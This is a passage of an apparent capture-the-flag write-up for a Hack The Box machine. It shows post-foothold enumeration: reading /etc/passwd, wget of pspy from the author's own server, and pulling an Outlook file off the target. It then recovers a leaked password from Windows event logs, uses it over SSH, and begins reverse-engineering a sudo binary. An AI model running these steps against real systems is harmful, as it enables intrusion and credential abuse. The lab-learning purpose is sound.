+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ grep -vE <span class=s2>&#34;/usr/sbin/nologin|/bin/false&#34;</span> /etc/passwd     
+</span></span><span class=line><span class=cl>root❌0:0:root:/root:/bin/bash
+</span></span><span class=line><span class=cl>sync❌4:65534:sync:/bin:/bin/sync
+</span></span><span class=line><span class=cl>smorton❌1000:1000:eForenzics:/home/smorton:/bin/bash
+</span></span></code></pre></td></tr></table></div></div><p>Unfortunately, no read access to <code>/home/smorton</code>. I ran a HTTP server on my own machine with <code>python -m http.server 8888</code> and ran a <code>wget</code> in the shell to download <a href=https://github.com/DominicBreuker/pspy target=_blank rel="noopener noreffer">pspy</a>, which when run will show what various processes are up to, <em>without</em> requiring root by scanning procfs. When I run pspy, and upload a file through the web app again, I see:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>2023/02/10 10:47:30 CMD: UID=33   PID=31499  | sh -c cd /var/www/uploads/1676026050 &amp;&amp; /opt/exiftool/exiftool * &gt; /var/www/html/analysed_images/blackcatsmjpg.txt 
+</span></span><span class=line><span class=cl>2023/02/10 10:47:30 CMD: UID=33   PID=31500  | /usr/bin/perl -w /opt/exiftool/exiftool black_cat_sm.jpg 
+</span></span></code></pre></td></tr></table></div></div><p>I couldn&rsquo;t see anything interesting that stood out apart from what we&rsquo;ve already exploited that gives access to the <code>www-data</code> (UID=33) user. Next, I decided to check which files the only non-root user on the system owns:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>www-data@investigation:~$ find / -user smorton 2&gt; /dev/null
+</span></span><span class=line><span class=cl>/home/smorton
+</span></span><span class=line><span class=cl>/usr/local/investigation/Windows Event Logs for Analysis.msg
+</span></span><span class=line><span class=cl>www-data@investigation:~$ ls -la &#39;/usr/local/investigation/Windows Event Logs for Analysis.msg&#39;
+</span></span><span class=line><span class=cl>-rw-rw-r-- 1 smorton smorton 1308160 Oct  1 00:35 &#39;/usr/local/investigation/Windows Event Logs for Analysis.msg&#39;
+</span></span></code></pre></td></tr></table></div></div><p>I have read access to this, so ran <code>python -m http.server 8888</code> within this directory and then from my own machine <code>wget "http://10.10.11.197:8888/Windows Event Logs for Analysis.msg"</code> to grab the file.</p><p>According to <code>file</code>, this is an Outlook message:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$file</span> Windows<span class=se>\ </span>Event<span class=se>\ </span>Logs<span class=se>\ </span><span class=k>for</span><span class=se>\ </span>Analysis.msg 
+</span></span><span class=line><span class=cl>Windows Event Logs <span class=k>for</span> Analysis.msg: CDFV2 Microsoft Outlook Message
+</span></span></code></pre></td></tr></table></div></div><p>I found this blog on forensics of malicious Outlook emails from within Linux <a href=https://blog.joshlemon.com.au/analysing-malicious-email-files-d85d8ff76a91 target=_blank rel="noopener noreffer">https://blog.joshlemon.com.au/analysing-malicious-email-files-d85d8ff76a91</a>, which involves installing <code>libemail-outlook-message-perl</code>and <code>libemail-sender-perl</code>, and using the <code>msgconvert</code> to convert .msg to plain text .eml file:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$msgconvert</span> Windows<span class=se>\ </span>Event<span class=se>\ </span>Logs<span class=se>\ </span><span class=k>for</span><span class=se>\ </span>Analysis.msg 
+</span></span><span class=line><span class=cl><span class=nv>$ls</span> -la Windows<span class=se>\ </span>Event<span class=se>\ </span>Logs<span class=se>\ </span><span class=k>for</span><span class=se>\ </span>Analysis.*
+</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> zara zara <span class=m>1748972</span> Feb <span class=m>11</span> 07:38 <span class=s1>&#39;Windows Event Logs for Analysis.eml&#39;</span>
+</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> zara zara <span class=m>1308160</span> Oct  <span class=m>1</span> 10:35 <span class=s1>&#39;Windows Event Logs for Analysis.msg&#39;</span>
+</span></span></code></pre></td></tr></table></div></div><p>Once converted, we get:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Date: Tue, 16 Sept 2022 00:30:29 +0000
+</span></span><span class=line><span class=cl>MIME-Version: 1.0
+</span></span><span class=line><span class=cl>Content-Type: multipart/mixed; boundary=16760614911.Fac8C4.99198
+</span></span><span class=line><span class=cl>Content-Transfer-Encoding: 7bit
+</span></span><span class=line><span class=cl>Subject: Windows Event Logs for Analysis
+</span></span><span class=line><span class=cl>From: Thomas Jones &lt;thomas.jones@eforenzics.htb&gt;
+</span></span><span class=line><span class=cl>To: Steve Morton &lt;steve.morton@eforenzics.htb&gt;
+</span></span><span class=line><span class=cl>Thread-Topic: Windows Event Logs for Analysis
+</span></span><span class=line><span class=cl>Accept-Language: en-US
+</span></span><span class=line><span class=cl>Content-Language: en-US
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>--16760614911.Fac8C4.99198
+</span></span><span class=line><span class=cl>MIME-Version: 1.0
+</span></span><span class=line><span class=cl>Content-Type: multipart/alternative; boundary=16760614910.E53Dcf5.99198
+</span></span><span class=line><span class=cl>Content-Transfer-Encoding: 7bit
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>--16760614910.E53Dcf5.99198
+</span></span><span class=line><span class=cl>Content-Type: text/plain; charset=ISO-8859-1
+</span></span><span class=line><span class=cl>Content-Disposition: inline
+</span></span><span class=line><span class=cl>Content-Transfer-Encoding: 8bit
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Hi Steve,
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Can you look through these logs to see if our analysts have been logging on to the inspection terminal. I&#39;m concerned that they are moving data on to production without following our data transfer procedures. 
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Regards.
+</span></span><span class=line><span class=cl>Tom
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>--16760614910.E53Dcf5.99198
+</span></span><span class=line><span class=cl>Content-Type: application/rtf
+</span></span><span class=line><span class=cl>Content-Disposition: inline
+</span></span><span class=line><span class=cl>Content-Transfer-Encoding: base64
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>e1xydGYxXGFuc2lcYW5zaWNwZzEyNTJcZnJvbXRleHQgXGZiaWRpcyBcZGVmZjB7XGZvbnR0YmwK
+</span></span><span class=line><span class=cl>&lt;.. snip ..&gt;
+</span></span></code></pre></td></tr></table></div></div><p>After searching around, I found <code>munpack</code> for unpacking MIME based files from emails, (part of the <code>mpack</code> package on Parrot OS) and ran <code>munpack Windows\ Event\ Logs\ for\ Analysis.eml</code>, giving me the following:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$ls</span> -la
+</span></span><span class=line><span class=cl>total <span class=m>2964</span>
+</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>1</span> zara zara     <span class=m>126</span> Feb <span class=m>11</span> 07:59  .
+</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>1</span> zara zara     <span class=m>152</span> Feb <span class=m>11</span> 07:59  ..
+</span></span><span class=line><span class=cl>-rw------- <span class=m>1</span> zara zara <span class=m>1276591</span> Feb <span class=m>11</span> 07:59  evtx-logs.zip
+</span></span><span class=line><span class=cl>-rw------- <span class=m>1</span> zara zara     <span class=m>530</span> Feb <span class=m>11</span> 07:59  part1
+</span></span><span class=line><span class=cl>-rw------- <span class=m>1</span> zara zara     <span class=m>244</span> Feb <span class=m>11</span> 07:59  part1.desc
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>$unzip</span> evtx-logs.zip 
+</span></span><span class=line><span class=cl>Archive:  evtx-logs.zip
+</span></span><span class=line><span class=cl>  inflating: security.evtx
+</span></span></code></pre></td></tr></table></div></div><p>I initially installed <code>libevtx-utils</code> and ran <code>evtexport</code>, which complained the file signature was invalid. I opened <code>security.evtx</code> in a hex editor and checked the signature and other expected bytes against <a href=https://github.com/libyal/libevtx/blob/main/documentation/Windows%20XML%20Event%20Log%20%28EVTX%29.asciidoc target=_blank rel="noopener noreffer">libevtx/Windows XML Event Log (EVTX).asciidoc at main · libyal/libevtx · GitHub</a>, but couldn&rsquo;t see an issue. I next tried <a href=https://github.com/williballenthin/python-evtx target=_blank rel="noopener noreffer">python-evtx</a>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$python</span> ~/.local/bin/evtx_dump.py security.evtx &gt; security.xml
+</span></span></code></pre></td></tr></table></div></div><p>Looking in our newly generated XML file, where we see windows security log events, I searched for instances of <code>smorton</code>, <code>password</code> , <code>token</code> expecting a credential leak.</p><p>The email hints at &ldquo;moving data on to production without following our data transfer procedures&rdquo;. Searching around online for USB related event IDs, we find Event 6416. We find this in the log, and USB device <code>USB\VID_0E0F&amp;PID_0002\6&amp;30c5d09c&amp;0&amp;7</code></p><p>I will save the gory details, but I used <code>lsusb</code> and did a <code>dd if=/dev/usb/002/003 of=/tmp/usb-out</code> and tried to run PhotoRec, <code>mount</code> and otherwise look at the resulting 43 byte file for a signature &ndash; but this was a complete rabbit hole that led nowhere (eek). I incorrectly assumed there was a USB stick used for &lsquo;moving data&rsquo; that was now plugged into our target &ndash; a rabbit hole.</p><p>After a while of looking through the logs and noticing login attempts for both the local machine and to a domain controller, I found this:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=nt>&lt;Event</span> <span class=na>xmlns=</span><span class=s>&#34;http://schemas.microsoft.com/win/2004/08/events/event&#34;</span><span class=nt>&gt;&lt;System&gt;&lt;Provider</span> <span class=na>Name=</span><span class=s>&#34;Microsoft-Windows-Security-Auditing&#34;</span> <span class=na>Guid=</span><span class=s>&#34;{54849625-5478-4994-a5ba-3e3b0328c30d}&#34;</span><span class=nt>&gt;&lt;/Provider&gt;</span>
+</span></span><span class=line><span class=cl><span class=nt>&lt;EventID</span> <span class=na>Qualifiers=</span><span class=s>&#34;&#34;</span><span class=nt>&gt;</span>4776<span class=nt>&lt;/EventID&gt;</span>
+</span></span><span class=line><span class=cl><span class=nt>&lt;Version&gt;</span>0<span class=nt>&lt;/Version&gt;</span>
+</span></span><span class=line><span class=cl><span class=nt>&lt;Level&gt;</span>0<span class=nt>&lt;/Level&gt;</span>
+</span></span><span class=line><span class=cl><span class=nt>&lt;Task&gt;</span>14336<span class=nt>&lt;/Task&gt;</span>
+</span></span><span class=line><span class=cl><span class=nt>&lt;Opcode&gt;</span>0<span class=nt>&lt;/Opcode&gt;</span>
+</span></span><span class=line><span class=cl><span class=nt>&lt;Keywords&gt;</span>0x8010000000000000<span class=nt>&lt;/Keywords&gt;</span>
+</span></span><span class=line><span class=cl><span class=nt>&lt;TimeCreated</span> <span class=na>SystemTime=</span><span class=s>&#34;2022-08-01 19:15:15.374672&#34;</span><span class=nt>&gt;&lt;/TimeCreated&gt;</span>
+</span></span><span class=line><span class=cl><span class=nt>&lt;EventRecordID&gt;</span>11373330<span class=nt>&lt;/EventRecordID&gt;</span>
+</span></span><span class=line><span class=cl><span class=nt>&lt;Correlation</span> <span class=na>ActivityID=</span><span class=s>&#34;{6a946884-a5bc-0001-d968-946abca5d801}&#34;</span> <span class=na>RelatedActivityID=</span><span class=s>&#34;&#34;</span><span class=nt>&gt;&lt;/Correlation&gt;</span>
+</span></span><span class=line><span class=cl><span class=nt>&lt;Execution</span> <span class=na>ProcessID=</span><span class=s>&#34;628&#34;</span> <span class=na>ThreadID=</span><span class=s>&#34;6800&#34;</span><span class=nt>&gt;&lt;/Execution&gt;</span>
+</span></span><span class=line><span class=cl><span class=nt>&lt;Channel&gt;</span>Security<span class=nt>&lt;/Channel&gt;</span>
+</span></span><span class=line><span class=cl><span class=nt>&lt;Computer&gt;</span>eForenzics-DI<span class=nt>&lt;/Computer&gt;</span>
+</span></span><span class=line><span class=cl><span class=nt>&lt;Security</span> <span class=na>UserID=</span><span class=s>&#34;&#34;</span><span class=nt>&gt;&lt;/Security&gt;</span>
+</span></span><span class=line><span class=cl><span class=nt>&lt;/System&gt;</span>
+</span></span><span class=line><span class=cl><span class=nt>&lt;EventData&gt;&lt;Data</span> <span class=na>Name=</span><span class=s>&#34;PackageName&#34;</span><span class=nt>&gt;</span>MICROSOFT_AUTHENTICATION_PACKAGE_V1_0<span class=nt>&lt;/Data&gt;</span>
+</span></span><span class=line><span class=cl><span class=nt>&lt;Data</span> <span class=na>Name=</span><span class=s>&#34;TargetUserName&#34;</span><span class=nt>&gt;</span>Def@ultf0r3nz!csPa$$<span class=nt>&lt;/Data&gt;</span>
+</span></span><span class=line><span class=cl><span class=nt>&lt;Data</span> <span class=na>Name=</span><span class=s>&#34;Workstation&#34;</span><span class=nt>&gt;</span>EFORENZICS-DI<span class=nt>&lt;/Data&gt;</span>
+</span></span><span class=line><span class=cl><span class=nt>&lt;Data</span> <span class=na>Name=</span><span class=s>&#34;Status&#34;</span><span class=nt>&gt;</span>0xc0000064<span class=nt>&lt;/Data&gt;</span>
+</span></span><span class=line><span class=cl><span class=nt>&lt;/EventData&gt;</span>
+</span></span><span class=line><span class=cl><span class=nt>&lt;/Event&gt;</span>
+</span></span></code></pre></td></tr></table></div></div><p>This is a Kerberos auth attempt where the user accidentally entered their password <code>Def@ultf0r3nz!csPa$$</code> in the username field. This took me a good couple of hours to find given the file size.</p><p>With that in mind, we are able to SSH in as <code>smorton</code> / <code>Def@ultf0r3nz!csPa$$</code>, and get the user flag!:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl> <span class=nv>$ssh</span> smorton@eforenzics.htb
+</span></span><span class=line><span class=cl>smorton@eforenzics.htb<span class=err>&#39;</span>s password: 
+</span></span><span class=line><span class=cl>Welcome to Ubuntu 20.04.5 LTS <span class=o>(</span>GNU/Linux 5.4.0-137-generic x86_64<span class=o>)</span>
+</span></span><span class=line><span class=cl>Last login: Sat Feb <span class=m>11</span> 05:39:11 <span class=m>2023</span> from 10.10.14.33
+</span></span><span class=line><span class=cl>smorton@investigation:~$ ls -la
+</span></span><span class=line><span class=cl>-rw-r----- <span class=m>1</span> root    smorton   <span class=m>33</span> Feb <span class=m>10</span> 05:34 user.txt
+</span></span><span class=line><span class=cl>smorton@investigation:~$ cat user.txt
+</span></span><span class=line><span class=cl>87f09a5f3c821e7f67799b2ba89f69f6
+</span></span></code></pre></td></tr></table></div></div><p>First, we find an executable we can run as root:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>smorton@investigation:~$ sudo -l
+</span></span><span class=line><span class=cl>Matching Defaults entries <span class=k>for</span> smorton on investigation:
+</span></span><span class=line><span class=cl>    env_reset, mail_badpass, <span class=nv>secure_path</span><span class=o>=</span>/usr/local/sbin<span class=se>\:</span>/usr/local/bin<span class=se>\:</span>/usr/sbin<span class=se>\:</span>/usr/bin<span class=se>\:</span>/sbin<span class=se>\:</span>/bin<span class=se>\:</span>/snap/bin
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>User smorton may run the following commands on investigation:
+</span></span><span class=line><span class=cl>    <span class=o>(</span>root<span class=o>)</span> NOPASSWD: /usr/bin/binary
+</span></span></code></pre></td></tr></table></div></div><p>My intuition was to look at this straight way, given the file name was quite unusual, and the output is not very helpful:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>smorton@investigation:~$ sudo /usr/bin/binary
+</span></span><span class=line><span class=cl>Exiting... 
+</span></span></code></pre></td></tr></table></div></div><p>Running <code>strings /usr/bin/binary</code> didn&rsquo;t contain anything interesting, so i downloaded a copy of the binary and disassembled it in <a href=https://ghidra-sre.org/ target=_blank rel="noopener noreffer">Ghidra</a>.</p><p>We can see the following occurs:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/2023-02-11-17-50-30-image.png data-srcset="./assets/2023-02-11-17-50-30-image.png, ./assets/2023-02-11-17-50-30-image.png 1.5x, ./assets/2023-02-11-17-50-30-image.png 2x" data-sizes=auto alt=./assets/2023-02-11-17-50-30-image.png title=./assets/2023-02-11-17-50-30-image.png></p><p>A breakdown of the above:</p><ol><li>We push existing base pointer (RBP) on to the stack with <code>PUSH RBP</code>, likely so main can return to libc (libc is the entry point for ELF binaries into <code>main()</code>)</li><li>Our existing stack pointer becomes the new Base Pointer for our main function with <code>MOV RBP, RSP</code>.</li><li>We subtract 0x50 bytes from the stack pointer with <code>SUB RSP, 0x50</code>, which allocates storage on the stack for local variables in the main function (remember the stack grows down to lower memory addresses)</li><li>We move <code>EDI</code>, <code>RSI</code> registers into local variables offset from <code>RBP</code> (64-bit assembly will pass function arguments in registers, and move these on to the stack by addressing offsets from <code>RBP</code>)</li><li>We compare local variable <code>[RBP + local_4c]</code> (argument received by the callee function) with value <code>0x3</code> , which will subtract <code>0x3</code> from this variable. If the result is zero, the <code>JZ LAB_00101462</code> instruction will jump to this label/address. Otherwise, we get the <code>Exiting...</code> text we see in STDOUT above</li></ol><p>Keep in mind <code>__libc_start_main</code> will initialise our app and call into <code>main</code> as part of the ELF loading & initialization process &ndash; and <code>main</code> takes 2 arguments - <code>argc</code> (number of arguments) and <code>argv[]</code> (array of pointers to the arguments themselves)</p><p>We are looking at <code>argc</code> here, and checking if it&rsquo;s value is 3. The number of arguments passed to our application should be 2, as the application name is included itself &ndash; so we expect 2 user arguments + name of app = 3.</p><p>Let&rsquo;s look at where the <code>JZ</code> instruction will jump to:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/2023-02-11-18-10-17-image.png data-srcset="./assets/2023-02-11-18-10-17-image.png, ./assets/2023-02-11-18-10-17-image.png 1.5x, ./assets/2023-02-11-18-10-17-image.png 2x" data-sizes=auto alt=./assets/2023-02-11-18-10-17-image.png title=./assets/2023-02-11-18-10-17-image.png></p><ol><li>we call <code>getuid()</code> in libc</li><li>We compare the result in <code>EAX</code> register against itself, which will set the zero flag to <code>ZF=1</code> if EAX is 0</li><li>If the zero flag is zero, we <code>JMP LAB_00101481</code> &ndash; so we&rsquo;re going to exit the app if not running as root</li></ol><p>Continuing on..</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/2023-02-11-18-20-02-image.png data-srcset="./assets/2023-02-11-18-20-02-image.png, ./assets/2023-02-11-18-20-02-image.png 1.5x, ./assets/2023-02-11-18-20-02-image.png 2x" data-sizes=auto alt=./assets/2023-02-11-18-20-02-image.png title=./assets/2023-02-11-18-20-02-image.png></p><ol><li>We take our local variable on the stack for the second argument to main, add <code>0x10</code> to it, and then dereference this value storing it in <code>RAX</code></li><li>we load effective address (<code>LEA</code>) of a string pointer into <code>RSI</code> and <code>RAX</code> is moved into <code>RDI</code>, setting up the call to <code>strcmp</code></li><li>We call out to <code>strcmp</code> (also in libc), which will work its magic on comparing arguments in <code>RDI</code> and <code>RSI</code> (1st and 2nd arguments to function respectively) &ndash; so we&rsquo;re effectively ensuring the address at <code>param_2 + 0x10</code> contains the string literal <code>lDnxUysaQn</code></li></ol><p><code>param_2</code> is the pointer to the beginning of <code>argv[]</code> array passed into <code>main</code>, so we&rsquo;re looking at <code>0x10</code> = 16 bytes offset, which is the 3rd argument</p><p>Next up:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/2023-02-11-18-27-43-image.png data-srcset="./assets/2023-02-11-18-27-43-image.png, ./assets/2023-02-11-18-27-43-image.png 1.5x, ./assets/2023-02-11-18-27-43-image.png 2x" data-sizes=auto alt=./assets/2023-02-11-18-27-43-image.png title=./assets/2023-02-11-18-27-43-image.png></p><p>We dereference and grab the <code>lDnxUysaQn</code> string plus <code>DAT_00102027</code> which are moved into <code>RDI</code> and <code>RSI</code>, thus becoming args to <code>fopen</code> (so we&rsquo;re opening file with name <code>lDnxUysaQn</code> in mode <code>wb</code> &ndash; write binary)</p><p>So, summarising the rather lengthy 64-bit assembly above, our app will expect 3 arguments (one of which includes itself) in the form <code>sudo /usr/bin/binary something-here lDnxUysaQn</code> &ndash; and open file <code>lDnxUysaQn</code> for some reason..</p><p>At this point, going through raw assembly line by line was becoming tedious, so I decided to run and debug the binary in GDB. I set breakpoints on calls to <a href=https://curl.se/libcurl/c/curl_easy_setopt.html target=_blank rel="noopener noreffer">curl_easy_setopt()</a>, a function in libcurl &ndash; and our binary calls it three times.</p><p>Let&rsquo;s run our app, and breakpoint on each call &ndash; and look at the registers set to determine what arguments are passed to this function:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>0x00005555555554f9 &lt;+198&gt;:    call   0x555555555130 &lt;curl_easy_setopt@plt&gt;
+</span></span><span class=line><span class=cl>   0x00005555555554fe &lt;+203&gt;:    movl   $0x2711,-0x34(%rbp)
+</span></span><span class=line><span class=cl>   0x0000555555555505 &lt;+210&gt;:    mov    -0x34(%rbp),%ecx
+</span></span><span class=line><span class=cl>   0x0000555555555508 &lt;+213&gt;:    mov    -0x28(%rbp),%rdx
+</span></span><span class=line><span class=cl>   0x000055555555550c &lt;+217&gt;:    mov    -0x20(%rbp),%rax
+</span></span><span class=line><span class=cl>   0x0000555555555510 &lt;+221&gt;:    mov    %ecx,%esi
+</span></span><span class=line><span class=cl>   0x0000555555555512 &lt;+223&gt;:    mov    %rax,%rdi
+</span></span><span class=line><span class=cl>   0x0000555555555515 &lt;+226&gt;:    mov    $0x0,%eax
+</span></span><span class=line><span class=cl>   0x000055555555551a &lt;+231&gt;:    call   0x555555555130 &lt;curl_easy_setopt@plt&gt;
+</span></span><span class=line><span class=cl>   0x000055555555551f &lt;+236&gt;:    movl   $0x2d,-0x30(%rbp)
+</span></span><span class=line><span class=cl>   0x0000555555555526 &lt;+243&gt;:    mov    -0x30(%rbp),%ecx
+</span></span><span class=line><span class=cl>   0x0000555555555529 &lt;+246&gt;:    mov    -0x20(%rbp),%rax
+</span></span><span class=line><span class=cl>   0x000055555555552d &lt;+250&gt;:    mov    $0x1,%edx
+</span></span><span class=line><span class=cl>   0x0000555555555532 &lt;+255&gt;:    mov    %ecx,%esi
+</span></span><span class=line><span class=cl>   0x0000555555555534 &lt;+257&gt;:    mov    %rax,%rdi
+</span></span><span class=line><span class=cl>   0x0000555555555537 &lt;+260&gt;:    mov    $0x0,%eax
+</span></span><span class=line><span class=cl>   0x000055555555553c &lt;+265&gt;:    call   0x555555555130 &lt;curl_easy_setopt@plt&gt;
+</span></span><span class=line><span class=cl>   0x0000555555555541 &lt;+270&gt;:    mov    -0x20(%rbp),%rax
+</span></span><span class=line><span class=cl>   0x0000555555555545 &lt;+274&gt;:    mov    %rax,%rdi
+</span></span><span class=line><span class=cl>   0x0000555555555548 &lt;+277&gt;:    call   0x555555555170 &lt;curl_easy_perform@plt&gt;
+</span></span><span class=line><span class=cl>(gdb) break *0x00005555555554f9
+</span></span><span class=line><span class=cl>Breakpoint 5 at 0x5555555554f9
+</span></span><span class=line><span class=cl>(gdb) break *0x000055555555551a
+</span></span><span class=line><span class=cl>Breakpoint 6 at 0x55555555551a
+</span></span><span class=line><span class=cl>(gdb) break *0x000055555555553c
+</span></span><span class=line><span class=cl>Breakpoint 7 at 0x55555555553c
+</span></span><span class=line><span class=cl>(gdb) break *0x0000555555555548
+</span></span><span class=line><span class=cl>Breakpoint 8 at 0x555555555548
+</span></span><span class=line><span class=cl>(gdb) r foobarbaz lDnxUysaQn
+</span></span><span class=line><span class=cl>Starting program: /home/zara/investigation/binary foobarbaz lDnxUysaQn
+</span></span><span class=line><span class=cl>[Thread debugging using libthread_db enabled]
+</span></span><span class=line><span class=cl>Using host libthread_db library &#34;/lib/x86_64-linux-gnu/libthread_db.so.1&#34;.
+</span></span><span class=line><span class=cl>Running... 
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Breakpoint 5, 0x00005555555554f9 in main ()
+</span></span><span class=line><span class=cl>(gdb) print $rip
+</span></span><span class=line><span class=cl>$9 = (void (*)()) 0x5555555554f9 &lt;main+198&gt;
+</span></span><span class=line><span class=cl>(gdb) x/wx $rdi
+</span></span><span class=line><span class=cl>0x555555575a10:    0xc0dedbad
+</span></span><span class=line><span class=cl>(gdb) x/wx $rsi
+</span></span><span class=line><span class=cl>0x2712:    Cannot access memory at address 0x2712
+</span></span><span class=line><span class=cl>(gdb) x/s $rdx
